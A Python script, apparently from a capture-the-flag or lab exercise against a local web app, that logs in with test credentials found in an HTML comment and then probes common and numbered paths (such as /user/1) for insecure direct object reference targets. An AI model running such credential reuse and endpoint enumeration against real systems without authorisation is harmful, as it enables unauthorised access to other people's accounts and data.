import requests
from bs4 import BeautifulSoup
import re
import urllib.parse

print("[+] ATTEMPTING LOGIN WITH DISCOVERED CREDENTIALS")
print("=" * 80)

base_url = "http://127.0.0.1:32941/"
session = requests.Session()

# First, let's login with the test credentials mentioned in the HTML comment
login_data = {
    'username': 'test'
}

response = session.post(base_url, data=login_data, timeout=10)
print(f"Login POST Response: Status {response.status_code}")
print(f"Response Length: {len(response.content)}B")

# Check if we have any session cookies
cookies = session.cookies.get_dict()
print(f"\n[COOKIES RECEIVED]: {len(cookies)}")
for name, value in cookies.items():
    print(f"  {name}: {value[:50]}...")

# If login successful, use session to discover endpoints
if response.status_code in [200, 302]:
    print("\n[+] LOGIN SUCCESSFUL - SYSTEMATICALLY DISCOVERING ENDPOINTS")
    print("=" * 80)
    
    # Common endpoints that might have ID parameters
    common_paths = [
        'profile', 'user', 'account', 'dashboard',
        'trade', 'trades', 'order', 'orders',
        'balance', 'portfolio', 'settings'
    ]
    
    discovered_endpoints = []
    
    for path in common_paths:
        # Try with and without trailing slash
        for url_format in ['{}/', '{}']:
            full_path = url_format.format(path)
            url = urllib.parse.urljoin(base_url, full_path.lstrip('/'))
            
            try:
                resp = session.get(url, timeout=5)
                if resp.status_code != 404:
                    print(f"[FOUND] /{full_path} → Status: {resp.status_code}")
                    discovered_endpoints.append({
                        'path': f'/{path}',
                        'status': resp.status_code,
                        'length': len(resp.content)
                    })
                    
                    # If it's a 200, look for IDs in the response
                    if resp.status_code == 200:
                        # Look for numeric patterns that could be IDs
                        numbers = re.findall(r'[^\d](\d{1,5})[^\d]', resp.text)
                        unique_numbers = list(set(numbers))
                        if unique_numbers:
                            print(f"  → Found numbers: {unique_numbers[:5]}")
                            
            except Exception as e:
                pass
    
    # Check for numbered endpoints (like /user/1)
    print("\n[TESTING NUMBERED ENDPOINTS]")
    base_paths = ['user', 'users', 'profile', 'account', 'trade', 'order']
    
    for path in base_paths:
        found_working = False
        for test_id in ['1', '2', '3', '10']:
            url = urllib.parse.urljoin(base_url, f"{path}/{test_id}".lstrip('/'))
            try:
                resp = session.get(url, timeout=3)
                if resp.status_code not in [404]:
                    print(f"[FOUND] /{path}/{test_id} → Status: {resp.status_code}")
                    discovered_endpoints.append({
                        'path': f'/{path}/[ID]',
                        'status': resp.status_code,
                        'sample_id': test_id
                    })
                    found_working = True
            except:
                pass
        
        if found_working:
            print(f"  ✓ {path}/[ID] pattern exists - likely IDOR target!")
    
